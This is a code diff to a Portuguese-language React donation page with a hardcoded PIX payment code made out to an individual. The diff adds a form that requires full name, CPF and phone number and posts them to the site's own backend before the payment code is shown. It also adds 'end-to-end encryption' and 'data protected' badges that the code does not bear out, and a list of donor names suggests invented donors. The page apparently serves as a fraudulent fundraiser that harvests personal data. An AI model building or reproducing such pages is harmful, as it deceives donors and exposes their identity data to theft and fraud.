@@ -1,5 +1,5 @@
 import React, { useState, useEffect } from 'react';
-import { Search, Heart, Share, ShieldCheck, Copy, Check, Menu, X, MessageCircle, Facebook, Twitter, Link as LinkIcon, ArrowLeft } from 'lucide-react';
+import { Search, Heart, Share, ShieldCheck, Copy, Check, Menu, X, MessageCircle, Facebook, Twitter, Link as LinkIcon, ArrowLeft, Lock } from 'lucide-react';
 
 const DONOR_NAMES = [
   'Henrique', 'Ana', 'Carlos', 'Mariana', 'João', 'Beatriz', 'Lucas', 'Fernanda', 
@@ -603,11 +603,37 @@ function PaymentPage({ onBack, initialValue }: { onBack: () => void, initialValu
   const [pixGenerated, setPixGenerated] = useState(false);
   const [value, setValue] = useState(initialValue);
   const [copied, setCopied] = useState(false);
+  
+  // Form state
+  const [nome, setNome] = useState('');
+  const [cpf, setCpf] = useState('');
+  const [telefone, setTelefone] = useState('');
+  const [isLoading, setIsLoading] = useState(false);
 
   const handleCopy = () => {
     navigator.clipboard.writeText('00020101021126580014br.gov.bcb.pix013659152353-c62f-42d1-aaff-6c7538b71ae95204000053039865802BR5918PAULO R DA S SOUSA6008TRINDADE62070503***63045F6E');
     setCopied(true);
     setTimeout(() => setCopied(false), 2000);
+  };
+
+  const handleGeneratePix = async () => {
+    if (!nome || !cpf || !telefone || !value) return;
+    
+    setIsLoading(true);
+    try {
+      await fetch('/api/cadastro', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ nome, cpf, telefone, valor: value }),
+      });
+    } catch (error) {
+      console.error('Erro ao salvar cadastro', error);
+    } finally {
+      setIsLoading(false);
+      setPixGenerated(true);
+    }
   };
 
   return (
@@ -650,12 +676,50 @@ function PaymentPage({ onBack, initialValue }: { onBack: () => void, initialValu
                   />
                 </div>
               </div>
+
+              <div className="pt-4 border-t border-gray-100 space-y-4">
+                <h3 className="font-bold text-gray-900 text-sm uppercase tracking-wide">Seus Dados</h3>
+                
+                <div>
+                  <label className="block text-xs font-bold text-gray-600 mb-1.5">Nome Completo</label>
+                  <input 
+                    type="text" 
+                    placeholder="Digite seu nome completo" 
+                    value={nome}
+                    onChange={(e) => setNome(e.target.value)}
+                    className="w-full px-4 py-3 border border-gray-200 rounded-xl focus:ring-2 focus:ring-[#00c853] focus:border-[#00c853] outline-none text-gray-900 bg-gray-50 focus:bg-white transition-colors text-sm" 
+                  />
+                </div>
+
+                <div>
+                  <label className="block text-xs font-bold text-gray-600 mb-1.5">CPF</label>
+                  <input 
+                    type="text" 
+                    placeholder="000.000.000-00" 
+                    value={cpf}
+                    onChange={(e) => setCpf(e.target.value)}
+                    className="w-full px-4 py-3 border border-gray-200 rounded-xl focus:ring-2 focus:ring-[#00c853] focus:border-[#00c853] outline-none text-gray-900 bg-gray-50 focus:bg-white transition-colors text-sm" 
+                  />
+                </div>
+
+                <div>
+                  <label className="block text-xs font-bold text-gray-600 mb-1.5">Número de Telefone</label>
+                  <input 
+                    type="tel" 
+                    placeholder="(00) 00000-0000" 
+                    value={telefone}
+                    onChange={(e) => setTelefone(e.target.value)}
+                    className="w-full px-4 py-3 border border-gray-200 rounded-xl focus:ring-2 focus:ring-[#00c853] focus:border-[#00c853] outline-none text-gray-900 bg-gray-50 focus:bg-white transition-colors text-sm" 
+                  />
+                </div>
+              </div>
+
               <button 
-                onClick={() => setPixGenerated(true)}
-                disabled={!value || Number(value) <= 0}
-                className="w-full bg-[#00c853] hover:bg-green-600 disabled:bg-green-300 text-white font-bold py-4 rounded-xl text-lg transition-all shadow-md hover:shadow-lg transform hover:-translate-y-0.5 duration-200"
+                onClick={handleGeneratePix}
+                disabled={!value || Number(value) <= 0 || !nome || !cpf || !telefone || isLoading}
+                className="w-full bg-[#00c853] hover:bg-green-600 disabled:bg-green-300 text-white font-bold py-4 rounded-xl text-lg transition-all shadow-md hover:shadow-lg transform hover:-translate-y-0.5 duration-200 flex items-center justify-center gap-2"
               >
-                Continuar para o PIX
+                {isLoading ? 'Processando...' : 'Continuar para o PIX'}
               </button>
             </div>
           ) : (
@@ -686,9 +750,15 @@ function PaymentPage({ onBack, initialValue }: { onBack: () => void, initialValu
         </div>
 
         {/* Security Badge */}
-        <div className="flex items-center justify-center gap-2 text-gray-500 text-sm font-medium">
-          <ShieldCheck size={18} className="text-[#00c853]" />
-          Ambiente 100% seguro
+        <div className="flex flex-col items-center justify-center gap-3 text-gray-500 text-sm font-medium">
+          <div className="flex items-center gap-2">
+            <ShieldCheck size={18} className="text-[#00c853]" />
+            Ambiente 100% seguro
+          </div>
+          <div className="flex items-center gap-4 text-xs">
+            <span className="flex items-center gap-1"><Lock size={14} /> Criptografia de Ponta</span>
+            <span className="flex items-center gap-1"><Check size={14} /> Dados Protegidos</span>
+          </div>
         </div>
       </div>
     </div>
